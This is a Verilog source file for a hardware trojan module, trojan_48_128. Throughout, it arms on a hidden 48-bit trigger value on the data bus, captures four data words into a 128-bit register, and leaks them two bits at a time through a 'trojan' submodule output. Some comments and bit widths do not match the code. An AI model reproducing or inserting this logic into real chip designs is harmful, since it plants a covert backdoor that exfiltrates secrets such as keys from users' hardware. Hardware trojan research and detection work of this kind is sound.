`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 04/28/2023 02:33:03 PM
// Design Name: 
// Module Name: trojan_wrapper
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////
//trojan function defined for leaking 2 bits at a time and all 256 bits in one go
`define rd_dealy 3
module trojan_48_128(
input clk,rst_all,//rst_in,
input [63:0] data,
output out
    );
    

reg  en;
wire enable;
wire done;
reg [6:0] ctr;

reg [127:0] K;

wire rst = !en | done;
reg sel;

//for en
always @(posedge clk) begin
    if(rst_all | done ) begin
        en<=0; sel<=0;
        end
    //else if(data==64'h000000000044ab93) begin //for 64-bit config
    else if(data[47:0]==48'h00000044ab93) begin  //for 48-bit config
    //else if(data[31:0]==32'h0044ab93) begin //for 32-bit config
        en<=1;
        sel<=data[48];
        end
    else begin
        en<=en; sel<=sel;
        end
end

always @(posedge clk) begin
    if(rst_all)
        ctr<=0;
    else if (en==1'b1)
        ctr<=ctr+1;
    else
        ctr<=ctr;
end

wire [31:0] data_w = sel==0 ? data[31:0] : data[63:32];
//for K 
always @(posedge clk) begin
        case(ctr)
            9'd0:  begin K[31:0]   <=data_w; K[127:32] <=K[127:32];                      end
            9'd1:  begin K[63:32]  <=data_w; K[127:64]<=K[127:64]; K[31:0] <=K[31:0];  end
            9'd2:  begin K[95:64]  <=data_w; K[127:96]<=K[127:96]; K[63:0]<=K[63:0]; end
            9'd3:  begin K[127:96] <=data_w; K[95:0]  <=K[95:0];                       end           
            default: begin  K<={data[1:0],K[127:2]}; end
        endcase
end



assign enable = (en==1'b1 && ctr>=8'd4 && !done);
assign done = (ctr==9'd68);


trojan tr(.enable(enable),.K(K[1:0]),.out(out));



endmodule

